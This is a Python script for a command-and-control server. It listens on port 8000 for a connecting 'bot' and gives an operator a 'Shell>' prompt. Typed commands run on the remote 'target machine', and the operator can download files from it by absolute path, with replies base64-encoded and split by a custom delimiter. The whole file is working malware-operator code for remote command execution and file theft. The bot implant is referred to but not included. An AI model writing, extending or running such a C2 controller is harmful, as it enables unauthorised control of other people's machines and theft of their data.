#!/usr/bin/env python3

import socket, base64

def base64_decode(data):
    """This function removes the delimter from the encoded data as well as the padding

    Args:
        data (bytes): The encoded data

    Returns:
        _type_: bytes
    """
    # Establish the delimiter
    delim = b'!!#@'
    # Remove the delimiter
    data = data.split(delim)[0]
    # Remove the padding and return the decoded data
    return base64.b64decode(data).replace(b'=', b'')

def input_validator(input_prompt):
    output = ""
    while output == "":
        output = input(input_prompt)
    return output
    

def command_input():
    """This function takes the user input and returns it, will not proceed until the user enters a command
    if the user enters quit, the program will exit
    if the user enters download, the user will be prompted to enter a file name, the file will be downloaded to the current directory

    Returns:
        _type_: str
    """
    # Ask the user for a command
    command = ""
    file_name = ""
    # While loop to make sure the user enters a command
    while command == "":
        command = input("Shell> ")
        # Check to see if the user entered download
        if command.lower() == "download":
            # Ask the user for a file name
            while file_name == "":
                file_name = input("Enter the file's absolute path> ")
            # file_name = input_validator("Enter the file's absolute path> ")
    # Return the command and file name
    return command, file_name

def download_file(socket, file_name, command="download"):
    """This function downloads a file from the target machine

    Args:
        socket (_type_): The socket to receive data from
        file_name (_type_): The name of the file to download
    """
    # Bot is looking for command in specific format
    command = command + " " + file_name
    # Send the command to the bot
    socket.send(command.encode())
    # Receive the data from the bot
    full_file = receive_data(socket)
    # The bot will send a message if the file does not exist
    if base64_decode(full_file) == b"[-] File not found":
        print("\nFile not found\n")
        return
    # Write the file to directory the user chooses
    else:
        file_out_location = input("Where would you like to save the file? ")
        with open(file_out_location, 'wb') as f:
            f.write(base64_decode(full_file))


def receive_data(socket):
    """This function receives the data from the socket and returns it

    Args:
        socket (_type_): The socket to receive data from

    Returns:
        _type_: bytes
    """
    # Create a list to hold the fragments of data, dramatically increases speed
    fragments = []
    # While loop to receive the data
    while True:
        # Each fragment is 4096 bytes
        chunk = socket.recv(4096)
        # If the length of the chunk is less than 4096, we have received all the data
        if  len(chunk) < 4096:
            # Append the last chunk to the list and break out of the loop
            fragments.append(chunk)
            break
        # Append the chunk to the list
        fragments.append(chunk)
    full_data = b''.join(fragments)
    return full_data

def c2_server():
    c2_server = socket.socket()
    c2_server.bind(("0.0.0.0", 8000))
    print("Listening on port 8000")
    c2_server.listen(1)
    while True:
        # Accept the connection
        client, address = c2_server.accept()
        # Print the address of the client
        print(f"Connection from {address} has been established!")
        # While loop to keep the connection open
        user_continue = True
        while user_continue:
            # Get the command from the user
            command, file_name = command_input()
            # Check to see if the user entered download menu
            if file_name != "":
                download_file(client, file_name)
            # Check to see if the user entered quit
            else:
                client.send(command.encode())
                if command.lower() == "quit":
                    user_continue = False
                # Receive the data from the bot
                full_data = receive_data(client)
                decoded_data = base64_decode(full_data)
                print(decoded_data.decode())
        client.close()
        exit()

c2_server()
